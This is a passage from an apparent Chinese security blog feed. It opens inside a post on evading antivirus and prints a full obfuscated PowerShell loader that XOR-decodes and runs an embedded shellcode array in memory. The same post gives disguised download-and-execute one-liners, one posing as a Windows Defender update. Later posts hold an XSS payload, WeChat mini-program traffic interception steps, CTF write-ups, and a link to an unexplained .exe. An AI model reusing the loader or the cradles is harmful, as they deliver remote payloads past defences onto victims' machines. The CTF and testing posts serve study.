20,96,96,10,20,94,7,102,106,96,98,113,14,112,119,98,109,103,98,113,103,14,98,109,119,106,117,106,113,118,112,14,119,102,112,119,14,101,106,111,102,2,7,107,8,107,9,35,22,108,2,115,6,99,98,115,35,75,211,150,129,117,220,246,73,99,75,35,51,35,35,75,35,35,99,35,116,75,123,135,112,198,220,246,176,154,35,35,35,35,34,250,114,112,170,196,116,75,35,3,35,35,112,117,75,49,181,170,193,220,246,166,227,87,229,168,36,34,224,166,227,86,198,123,224,203,138,222,220,220,18,19,18,13,18,16,17,13,17,17,20,13,17,17,20,35,35,35,35,35)</span><br></pre></td></tr></table></figure><p>现在再拿到virustotal上面去看看<br><img src="https://s2.loli.net/2022/08/16/WdOi26SaTtkljQG.png"></p><p>离大谱，32/59不得不说，安全厂商估计也是天天在网上学习新的免杀方式</p><p>这里参考了Y4er师傅的处理方法，主要部分就是更改了关键字，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Set-StrictMode -Version 2</span><br><span class="line"></span><br><span class="line">$DoIt &#x3D; @&#39;</span><br><span class="line">function func_b &#123;</span><br><span class="line">Param ($amodule, $aprocedure)</span><br><span class="line">$aunsafe_native_methods &#x3D; ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\&#39;)[-1].Equals(&#39;System.dll&#39;) &#125;).GetType(&#39;Microsoft.Win32.Uns&#39;+&#39;afeN&#39;+&#39;ativeMethods&#39;)</span><br><span class="line">$agpa &#x3D; $aunsafe_native_methods.GetMethod(&#39;GetP&#39;+&#39;rocAddress&#39;, [Type[]] @(&#39;System.Runtime.InteropServices.HandleRef&#39;, &#39;string&#39;))</span><br><span class="line">return $agpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($aunsafe_native_methods.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($amodule)))), $aprocedure))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function func_a &#123;</span><br><span class="line">Param (</span><br><span class="line">[Parameter(Position &#x3D; 0, Mandatory &#x3D; $True)] [Type[]] $aparameters,</span><br><span class="line">[Parameter(Position &#x3D; 1)] [Type] $areturn_type &#x3D; [Void]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">$atype_b &#x3D; [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#39;Reflect&#39;+&#39;edDel&#39;+&#39;egate&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#39;InMemoryModule&#39;, $false).DefineType(&#39;MyDeleg&#39;+&#39;ateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate])</span><br><span class="line">$atype_b.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [System.Reflection.CallingConventions]::Standard, $aparameters).SetImplementationFlags(&#39;Runtime, Managed&#39;)</span><br><span class="line">$atype_b.DefineMethod(&#39;Inv&#39;+&#39;oke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $areturn_type, $aparameters).SetImplementationFlags(&#39;Runtime, Managed&#39;)</span><br><span class="line"></span><br><span class="line">return $atype_b.CreateType()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[Byte[]]$var_code &#x3D; [Byte[]](223,203,170,35,35,35,67,170,198,18,241,71,168,113,19,168,113,47,168,113,55,168,81,11,44,148,105,5,18,220,18,227,143,31,66,95,33,15,3,226,236,46,34,228,193,211,113,116,168,113,51,168,97,31,34,243,168,99,91,166,227,87,105,34,243,115,168,107,59,168,123,3,34,240,192,31,106,168,23,168,34,245,18,220,18,227,143,226,236,46,34,228,27,195,86,215,32,94,219,24,94,7,86,193,123,168,123,7,34,240,69,168,47,104,168,123,63,34,240,168,39,168,34,243,170,103,7,7,120,120,66,122,121,114,220,195,123,124,121,168,49,200,165,126,75,77,70,87,35,75,84,74,77,74,119,75,111,84,5,36,220,246,18,220,116,116,116,116,116,75,25,117,90,132,220,246,202,167,35,35,35,120,18,234,114,114,73,32,114,114,75,83,142,35,35,112,115,75,116,170,188,229,220,246,200,83,120,18,241,113,75,35,33,99,167,113,113,113,112,113,115,75,200,118,13,24,220,246,170,229,160,224,115,18,220,116,116,73,220,112,117,75,14,37,59,88,220,246,166,227,44,167,224,34,35,35,18,220,166,213,87,39,170,218,200,42,75,137,230,193,126,220,246,170,226,75,102,2,125,18,220,246,18,220,116,73,36,114,117,115,75,148,116,195,40,220,246,156,35,12,35,35,26,228,87,148,18,220,202,178,34,35,35,202,234,34,35,35,203,168,220,220,220,12,87,75,26,100,35,22,108,2,115,6,99,98,115,120,23,127,115,121,123,22,23,11,115,125,10,20,96,96,10,20,94,7,102,106,96,98,113,14,112,119,98,109,103,98,113,103,14,98,109,119,106,117,106,113,118,112,14,119,102,112,119,14,101,106,111,102,2,7,107,8,107,9,35,22,108,2,115,6,35,118,80,70,81,14,98,68,70,77,87,25,3,110,76,89,74,79,79,66,12,22,13,19,3,11,64,76,78,83,66,87,74,65,79,70,24,3,110,112,106,102,3,26,13,19,24,3,116,74,77,71,76,84,80,3,109,119,3,21,13,18,24,3,116,108,116,21,23,24,3,119,81,74,71,70,77,87,12,22,13,19,24,3,110,98,112,97,10,46,41,35,22,108,2,115,6,99,98,115,120,23,127,115,121,123,22,23,11,115,125,10,20,96,96,10,20,94,7,102,106,96,98,113,14,112,119,98,109,103,98,113,103,14,98,109,119,106,117,106,113,118,112,14,119,102,112,119,14,101,106,111,102,2,7,107,8,107,9,35,22,108,2,115,6,99,98,115,120,23,127,115,121,123,22,23,11,115,125,10,20,96,96,10,20,94,7,102,106,96,98,113,14,112,119,98,109,103,98,113,103,14,98,109,119,106,117,106,113,118,112,14,119,102,112,119,14,101,106,111,102,2,7,107,8,107,9,35,22,108,2,115,6,99,98,115,120,23,127,115,121,123,22,23,11,115,125,10,20,96,96,10,20,94,7,102,106,96,98,113,14,112,119,98,109,103,98,113,103,14,98,109,119,106,117,106,113,118,112,14,119,102,112,119,14,101,106,111,102,2,7,107,8,107,9,35,22,108,2,115,6,99,98,115,35,75,211,150,129,117,220,246,73,99,75,35,51,35,35,75,35,35,99,35,116,75,123,135,112,198,220,246,176,154,35,35,35,35,34,250,114,112,170,196,116,75,35,3,35,35,112,117,75,49,181,170,193,220,246,166,227,87,229,168,36,34,224,166,227,86,198,123,224,203,138,222,220,220,18,19,18,13,18,16,17,13,17,17,20,13,17,17,20,35,35,35,35,35)</span><br><span class="line"></span><br><span class="line">for ($x &#x3D; 0; $x -lt $acode.Count; $x++) &#123;</span><br><span class="line">$acode[$x] &#x3D; $acode[$x] -bxor 35</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ava &#x3D; [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_b kernel32.dll VirtualAlloc), (func_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="line">$abuffer &#x3D; $ava.Invoke([IntPtr]::Zero, $acode.Length, 0x3000, 0x40)</span><br><span class="line">[System.Runtime.InteropServices.Marshal]::Copy($acode, 0, $abuffer, $acode.length)</span><br><span class="line"></span><br><span class="line">$arunme &#x3D; [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($abuffer, (func_a @([IntPtr]) ([Void])))</span><br><span class="line">$arunme.Invoke([IntPtr]::Zero)</span><br><span class="line">&#39;@</span><br><span class="line"></span><br><span class="line">If ([IntPtr]::size -eq 8) &#123;</span><br><span class="line">start-job &#123; param($a) ie&#96;x $a &#125; -RunAs32 -Argument $DoIt | wait-job | Receive-Job</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">i&#96;ex $DoIt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们再放到virustotal上面试试<br><img src="https://s2.loli.net/2022/08/16/Eqp7YMwD8feWuVl.png"><br>28/60，也就多绕过了4个防火墙<br>还是太菜了，手动的话，大概就这样了，下面贴一下在执行远程执行脚本时代码混淆，直接执行cs生成的语句杀软拦截的混淆操作</p><ol><li><p>使用Replace替换关键字部分字母，加上通过拆分后重新组合<br><code>powershell.exe -nop -w hidden -c &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://0.0.0.0:4545/text.txt&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</code></p></li><li><p>使用powershell语言的特性来混淆代码</p></li></ol><p><code>cmd.exe /c &quot;powershell -c Write-Host SUCCESS -Fore Green&quot;</code></p><p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell -&quot;</code></p><p><code>cmd /c &quot;set p1=power&amp;&amp; set p2=shell&amp;&amp; cmd /c echo Write-Host SUCCESS -Fore Green ^|%p1%%p2% -&quot;</code></p><p>管道输入流：</p><p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell IEX $input&quot;</code></p><p>利用环境变量：</p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX $env:cmd&quot;</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%|powershell -</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ([Environment]::GetEnvironmentVariable(&#39;cmd&#39;, &#39;Process&#39;))</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ((Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value)</code></p><p>从其他进程获取参数：</p><p><code>cmd /c &quot;title WINDOWS_DEFENDER_UPDATE&amp;&amp;echo IEX (IWR https://7ell.me/power)&amp;&amp; FOR /L %i IN (1,1,1000) DO echo&quot;</code></p><hr><p><a href="https://mp.weixin.qq.com/s/TtKEnmUbtVMSqBCgrSj2Qw">参考文章</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次csdn的xss漏洞</title>
      <link href="2022/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1csdn%E7%9A%84xss%E6%BC%8F%E6%B4%9E/"/>
      <url>2022/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1csdn%E7%9A%84xss%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/07/06/uzAU24HoCVOB1kS.png"><br>csdn存在“猜你想搜”，并将其值存在placeholder中</p><p>在搜索xss相关信息后，将会推荐，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><p>如下图所示<br><img src="https://s2.loli.net/2022/07/06/mvx5pW2u6fUTLi3.png"><br>xss的执行语句被放到了placeholder中，且没有过滤</p><p>存在xss漏洞，成果如下图所示</p><p><img src="https://s2.loli.net/2022/07/06/BAbNqDlcxWEdgFK.png"></p><blockquote><p>成果<br><a href="/files/csdn_xss.mp4">成果演示</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>小程序渗透3</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F3/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F3/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序渗透测试（反编译）"><a href="#微信小程序渗透测试（反编译）" class="headerlink" title="微信小程序渗透测试（反编译）"></a>微信小程序渗透测试（反编译）</h1><p>代理的配置，成功抓包后，接下来就是对微信小程序的源码分析<br>首先下载微信<br>（注意：如果现在仍然挂着代理，将会无法正常下载微信）</p><p>我们在模拟器里登录微信，随便选择一个小程序打开</p><p>打开文件管理器，在会生成一个md5加密命名的文件夹（如果打开微信小程序过多，同时有多个文件夹不容易识别的情况，可以选择把文件夹所有内容删除掉，再去重新打开微信小程序，就会得到唯一一个MD5加密命名的文件夹）<br>在如图所示的路径下，能看到该小程序的文件夹<br><img src="https://s2.loli.net/2022/05/02/rkYKtlQaqmP8UH1.png"></p><p>一般都在/appbrand/pkg目录下，会看到带有后缀为wxapkg的文件<br>需要将其一一拷贝到本地主机下<br>注意：将整个文件夹复制大概率会使得文件管理系统停止工作而失败，所以需要一个一个文件的拷贝（确实麻烦！）</p><p>在夜神模拟器中，打开文件助手，找到模拟器与本地主机的共享文件夹<br><img src="https://s2.loli.net/2022/05/02/9oGFHnSsMeY4lUu.png"></p><p>开始拷贝文件（图形化交互确实慢。。）<br><img src="https://s2.loli.net/2022/05/02/kaIZgyobT6QuKth.png"></p><p>拷贝完文件之后，就是反编译了<br><a href="https://github.com/ezshine/wxapkg-convertor/releases"> GUI 界面的反编译工具</a></p><p>将文件拖入即可<br><img src="https://s2.loli.net/2022/05/02/Zng49N3rG5YmhQU.png"></p><p>所有的wxapkg文件编译完成<br><img src="https://s2.loli.net/2022/05/02/4oEBJD6SzH2LPuC.png"></p><p>接下来就是源码审计了<br><img src="https://s2.loli.net/2022/05/02/Shz3byPwKoZHd2l.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>小程序渗透2</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序渗透测试（抓包）"><a href="#微信小程序渗透测试（抓包）" class="headerlink" title="微信小程序渗透测试（抓包）"></a>微信小程序渗透测试（抓包）</h1><p>安卓7.0版本之后，模拟器无法正常下载证书，<br>导入的证书分为系统证书和用户证书。<br>之前导入的为用户证书，需要将其改为系统证书</p><p>使用openssl将证书格式转换<br>自行下载openssl（我这里使用的是kali自带的openssl）<br>查看是否已经安装openssl<br><img src="https://s2.loli.net/2022/05/01/BjFawSielCuV2ML.png"></p><p>将证书从der变为pem格式<br><img src="https://s2.loli.net/2022/05/01/SfeK6nDtphCFOZA.png"></p><p>打开夜神模拟器，根目录会有nox_adb.exe文件，用命令行去操控这个文件。（如果不是用夜神模拟器，也可以自己下载adb 工具，原理一样）<br><img src="https://s2.loli.net/2022/05/01/aSQtqwEZOBzTUIi.png"></p><p>从命令行里使用<br>首先检查其是否连接成功<br><img src="https://s2.loli.net/2022/05/01/kXPzrBoqd83ZFsi.png"><br>再切换到root模式，并改为可读写<br><img src="https://s2.loli.net/2022/05/01/m18nsXhLcHu3oiB.png"></p><p>查看该证书的hash值<br><img src="https://s2.loli.net/2022/05/01/aDwJW1LTkhKtF8p.png"></p><p>拷贝该证书，重命名为 hash结果里面的名称 <strong>注意这里要在名称后加.</strong><br><img src="https://s2.loli.net/2022/05/01/9E8fDIAmU2SsrQM.png"><br>这样就算完成了</p><p>PS:但是证书仍然会出现问题，目前还没找到解决的办法，但能成功抓包<br>所以还是建议使用7.0版本之前的安卓</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>小程序渗透1</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F1/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F1/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序渗透测试（抓包）"><a href="#微信小程序渗透测试（抓包）" class="headerlink" title="微信小程序渗透测试（抓包）"></a>微信小程序渗透测试（抓包）</h1><p>这是基于安卓7.0之前<br><a href="https://silver-glacier.github.io/2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/">7.0之后看这里</a></p><p>首先准备好一个安卓模拟器，我在这里使用的是夜神模拟器</p><p><img src="https://s2.loli.net/2022/05/01/KMcdE8il9Yu6NPW.png"><br>首先切换到root模式</p><p>给burpsuite加上本地IP的端口监听，如果是在虚拟机上实现，则加上对应的IP端口<br><img src="https://s2.loli.net/2022/05/01/gdYsDOaTp1z6tJn.png"></p><p>打开模拟器的网络连接设置，长按WiredSSID，修改网络，进入高级设置<br><img src="https://s2.loli.net/2022/05/01/51PevgYNJSsj9kt.png"></p><p>设置为手动代理，加上与burpsuite上相对应的IP以及端口号<br><img src="https://s2.loli.net/2022/05/01/8N2LTMwHvJIUsCW.png"></p><p>从浏览器打开相应的IP以及端口，下载相应的burpsuite的证书<br>（这里只是为了下载相应的证书，也可以从本地下载下来，再放入到模拟器中）<br><img src="https://s2.loli.net/2022/05/01/usxnIrJd4vCVqNA.png"></p><p>下载完成后，打开模拟器自带的文件管理系统，下载的证书将在download中<br><strong>这里注意！下载下来的证书很可能是灰色的，需要将后缀改为crt，der后缀文件可能存在识别错误的问题</strong><br><strong>其他问题：可能存在证书在download目录下也无法正常导入，需要将其移入其他目录（本人再这里未遇到该问题）</strong><br><img src="https://s2.loli.net/2022/05/01/lI4A7bcEVMZ2Nso.png"></p><p>成功导入证书后就完成了<br>我们打开百度测试一下<br><img src="https://s2.loli.net/2022/05/01/IiamvHD4TNAMSZP.png" alt="成功抓包"></p><p><a href="https://silver-glacier.github.io/2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/">如果提示证书安全问题看这里</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Welcome</title>
      <link href="2021/12/04/Welcome/"/>
      <url>2021/12/04/Welcome/</url>
      
        <content type="html"><![CDATA[<p><img src="/files/Welcome.jpg" alt="Welcome to my blog"><br><a href="http://92t35s.ceye.io/">千万别点</a><br><a href="/files/1111.exe">试试这个</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF2019-EasyJava</title>
      <link href="2021/02/12/RoarCTF2019-EasyJava/"/>
      <url>2021/02/12/RoarCTF2019-EasyJava/</url>
      
        <content type="html"><![CDATA[<h1 id="RoarCTF2019-Easy-Java"><a href="#RoarCTF2019-Easy-Java" class="headerlink" title="RoarCTF2019 Easy Java"></a>RoarCTF2019 Easy Java</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/02/12/gf1aFj5vrkZ9oHm.png"><br>试一下sql注入，好像不行</p><p><img src="https://i.loli.net/2021/02/12/Dh5LEzUCV62xsnG.png" alt="无论注入什么都是这个结果"></p><p>login下面有一个help，点开看一下<br><img src="https://i.loli.net/2021/02/12/FCrg82TzKhjQNe4.png"><br>抓包看一下吧<br>把GET改成POST<br>加上filename<br><img src="https://i.loli.net/2021/02/12/Jxy5GFaAdlEsKuh.png"></p><p>学习的新知识：</p><blockquote><p>WEB-INF主要包含一下文件或目录:<br>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件<br>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p></blockquote><p>写出payload<br><img src="https://i.loli.net/2021/02/12/pEGKV9Ax3Cw1PLR.png"></p><p>下载下来一个class文件<br>里面有一个类似于base64加密的东西，解码出来<br><img src="https://i.loli.net/2021/02/12/bXrPm3oVJESUvac.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF-Ez_bypass</title>
      <link href="2021/02/07/MRCTF-Ez-bypass/"/>
      <url>2021/02/07/MRCTF-Ez-bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="MRCTF-Ez-bypass"><a href="#MRCTF-Ez-bypass" class="headerlink" title="MRCTF Ez_bypass"></a>MRCTF Ez_bypass</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/02/08/PAFWiylpORLZ68q.png"><br>直接看源码吧，这样看确实很乱</p><p><img src="https://i.loli.net/2021/02/08/XsuxQV61cp5hKqA.png" alt="这样看就舒服多了"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先看到这一句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>)</span><br></pre></td></tr></table></figure><p>要求md5加密过后的内容相等，注意这里是php的强比较，而不是弱比较，但是又要本身的值不相等<br>查了一下，把他写成数组就好了，因为md5加密无法处理数组，任何数组的返回值都将是null<br>那这样的话就直接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id[]=<span class="number">1</span>&amp;gg[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>这样就越过了第一个if了<br>然后再用hackbar传上去<br><img src="https://i.loli.net/2021/02/08/wGOhcUqKHjMWyQr.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))</span><br></pre></td></tr></table></figure><p>这个数字的检测，很简单，passwd=1234567a就好了</p><p>再把他POST上去<br><img src="https://i.loli.net/2021/02/08/3HgFAWONIpEyGh4.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019hard_sql</title>
      <link href="2021/02/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019hard-sql/"/>
      <url>2021/02/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019hard-sql/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战2019hard-sql"><a href="#极客大挑战2019hard-sql" class="headerlink" title="极客大挑战2019hard sql"></a>极客大挑战2019hard sql</h1><p>首先打开题目，先判断一下是什么注入，但是过滤掉了很多东西，这次新学会了一个操作，用字典去爆破sql，来看它过滤掉了哪些<br><img src="https://i.loli.net/2021/02/07/wVvT2d4Cbynqjg6.png"><br>这个过滤掉了很多，那么就可能是报错注入了，因为它好像没有过滤掉updatexml</p><p>那我们试一下<br><img src="https://i.loli.net/2021/02/07/rkqzPCYHuJNn9SZ.png"></p><p>确实是报错注入，那我们就接着爆tables<br><img src="https://i.loli.net/2021/02/07/uZNOi4HdKLeCAvT.png"></p><p>继续爆<br><img src="https://i.loli.net/2021/02/07/L3oXdbgDtrhfNOM.png"></p><p>爆出flag了，但是好像这个flag不完整，也不知道该怎么办<br><img src="https://i.loli.net/2021/02/07/OXYh78uHrdte1Gi.png"><br>看了大佬的wp才知道，可以left，right一下来把它全部爆出来</p><p><img src="https://i.loli.net/2021/02/07/QTEmtVawJ3nFd9Z.png" alt="left"><br><img src="https://i.loli.net/2021/02/07/9QaP1O3LEBUjnTw.png" alt="right"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019-buy_flag</title>
      <link href="2021/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-buy-flag/"/>
      <url>2021/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-buy-flag/</url>
      
